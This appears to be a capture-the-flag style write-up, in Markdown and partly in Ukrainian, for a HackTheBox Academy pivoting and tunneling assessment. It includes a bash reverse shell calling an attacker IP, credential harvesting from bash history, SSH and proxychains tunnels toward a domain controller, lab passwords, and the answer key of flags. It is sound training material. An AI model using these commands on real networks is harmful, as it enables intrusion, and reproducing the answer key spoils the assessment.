# Skills Assessment — Pivoting, Tunneling, and Port Forwarding

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1441](https://academy.hackthebox.com/module/158/section/1441) |

---

## 🗺️ Scenario

Команда залишила **web shell** на `support.inlanefreight.local`. Потрібно:
1. Увійти через web shell
2. Енумерувати і пітватись у внутрішню мережу
3. Дістатись до **Domain Controller** Inlanefreight
4. Зібрати всі флаги по шляху

---

## 🌐 Network Map

```
Internet
  └─ 10.129.x.x — ACADEMY-PIVOT-WEB01 (web shell)
       └─ Internal Network 1
            └─ mlefay@172.16.5.35 — Pivot Host 1
                 └─ Internal Network 2
                      └─ vfrank@??? — Pivot Host 2
                           └─ Domain Controller — фінальний таргет
```

---

## 🔑 Credentials

| Host | User | Password | Як отримано |
|------|------|----------|-------------|
| WEB01 (web shell) | webadmin | — | Залишено попередньою командою |
| 172.16.5.35 | mlefay | Plain Human work! | Знайдено на WEB01 |
| Pivot Host 2 | vfrank | Imply wet Unmasked! | Знайдено на 172.16.5.35 |

---

## 🛠️ Attack Chain

### Крок 1 — Web Shell → WEB01

```bash
# Відкрий у браузері або через curl
curl http://10.129.x.x/shell.php?cmd=whoami
# → webadmin

# Або через браузер → запусти reverse shell
```

Reverse shell через web shell:
```bash
# На Kali — слухай
nc -lvnp 4444

# Через web shell
bash -c 'bash -i >& /dev/tcp/<kali_ip>/4444 0>&1'
```

### Крок 2 — Енумерація на WEB01

```bash
# Знайди credentials і внутрішні хости
ifconfig
# ens192: 10.129.x.x (зовнішній)
# ens224: 172.16.5.x (внутрішній)

cat /etc/hosts
cat /home/webadmin/.bash_history
# → mlefay:Plain Human work!
# → 172.16.5.35
```

### Крок 3 — SSH тунель через WEB01 до 172.16.5.35

```bash
# На Kali — SSH local port forward
ssh -L 1234:172.16.5.35:22 webadmin@10.129.x.x

# Або динамічний SOCKS
ssh -D 9050 webadmin@10.129.x.x -N

# Підключись до 172.16.5.35
ssh mlefay@172.16.5.35
# Pass: Plain Human work!
```

### Крок 4 — Флаг на 172.16.5.35

```bash
# На 172.16.5.35
find / -name "flag*" 2>/dev/null
cat ~/flag.txt
# → S1ngl3-Piv07-3@sy-Day
```

### Крок 5 — Енумерація на 172.16.5.35

```bash
# Знайди наступний хоп
ifconfig
# Знайди нову підмережу

# Знайди credentials для vfrank
cat /home/mlefay/.bash_history
grep -r "vfrank" /home/ 2>/dev/null
# → vfrank:Imply wet Unmasked!
```

### Крок 6 — Pivot до наступного хоста (vfrank)

```bash
# З Kali через подвійний тунель
ssh -J webadmin@10.129.x.x,mlefay@172.16.5.35 vfrank@<next_host>
# Pass: Imply wet Unmasked!

# Або через proxychains
proxychains ssh vfrank@<next_host>
```

### Крок 7 — Флаг на pivot host 2

```bash
find / -name "flag*" 2>/dev/null
# → N3tw0rk-H0pp1ng-f0R-FuN
```

### Крок 8 — Domain Controller → фінальний флаг

```bash
# Enum DC через внутрішню мережу
nmap -sV 172.16.x.x/24 --open -p 88,389,445,3389

# RDP або SMB до DC
proxychains xfreerdp3 /v:<dc_ip> /u:vfrank /p:'Imply wet Unmasked!' /cert:ignore
# Або
proxychains smbclient \\\\<dc_ip>\\C$ -U vfrank

# Знайди фінальний флаг
# → 3nd-0xf-Th3-R@inbow!
```

---

## ❓ Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Username of web shell user | `webadmin` |
| Q2 | Credentials found for mlefay | `mlefay:Plain Human work!` |
| Q3 | IP of next pivot host | `172.16.5.35` |
| Q4 | Flag on 172.16.5.35 | `S1ngl3-Piv07-3@sy-Day` |
| Q5 | Username on next pivot | `vfrank` |
| Q6 | Flag on second pivot | `N3tw0rk-H0pp1ng-f0R-FuN` |
| Q7 | Final flag (Domain Controller) | `3nd-0xf-Th3-R@inbow!` |
